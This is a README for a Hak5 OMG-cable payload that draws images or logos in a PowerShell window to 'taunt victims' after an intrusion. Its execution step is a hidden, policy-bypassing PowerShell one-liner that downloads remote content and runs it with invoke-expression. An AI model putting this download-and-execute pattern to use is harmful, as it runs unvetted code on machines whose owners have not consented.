![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-AcidBurn/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# OMG PS-Draw

A script used to generate and draw images in the Powershell Window, used to leave a signature or perhaps taunt victims

## Description

These two programs use two different method to draw out images in the Powershell Window. 
PS-Draw will convert an image you download into a BMP file estiamte the used colors based off the 16 available powershell colors 
then draw your image out in the powershell window. This process is not exact and needed testing of multiple images to find one that works well. 

PS-Custom-Draw generates images to be drawn in the Powershell Window based off pre-configured arrays I put together already included in the file itself. 
These images look significantly cleaner due to the fact they were drawn and coded specifically for this purpose.

## Getting Started

### Dependencies

* DropBox or another image hosting service - Your Shared link for the intended file
* Windows 10,11

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

* Plug in OMG Device
* Invoke-WebRequest will be used to download the image 

```
powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
```
* The image will be converted into a BMP file
* An algorithm will be used to find the closest matching colors available in the powershell window
* The image will be generated in the powershell window

This is an example of an image I used with the PS-Draw command 
![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-PS-Draw/Images/omg-ico.png)

This is how the iamge is interpreted and drawn out  
![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-PS-Draw/Images/PS-Draw.jpg)

* The PS-Custom-Draw operates a little differently 
* One of the preconfigured arrays is piped into the command to generate an image 
 
* "$col | PS-Draw"  - This first one will show the available colors to be used as seen below
 
![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-PS-Draw/Images/ps-colors.jpg)


* "$omg | PS-Draw"  - This will draw out the OMG logo as seen below
 
![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-PS-Draw/Images/ps-omg.jpg)


* "$hak5 | PS-Draw" - This will draw out the Hak5 logo as seen below
 
![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-PS-Draw/Images/ps-hak5.jpg)


<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributors names will be listed here

I am Jakoby

Arf

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<div><h2>I am Jakoby</h2></div>
  <p><br/>
  
  <img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 
  
  <a href="https://github.com/I-Am-Jakoby/">
    <img src="https://img.shields.io/badge/GitHub-I--Am--Jakoby-blue">
  </a>
  
  <a href="https://www.instagram.com/i_am_jakoby/">
    <img src="https://img.shields.io/badge/Instagram-i__am__jakoby-red">
  </a>
  
  <a href="https://twitter.com/I_Am_Jakoby/">
    <img src="https://img.shields.io/badge/Twitter-I__Am__Jakoby-blue">
  </a>
  
  <a href="https://www.youtube.com/c/IamJakoby/">
    <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
  </a>

  Project Link: [https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG-PS-Draw)
</p>


<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)

<p align="right">(<a href="#top">back to top</a>)</p>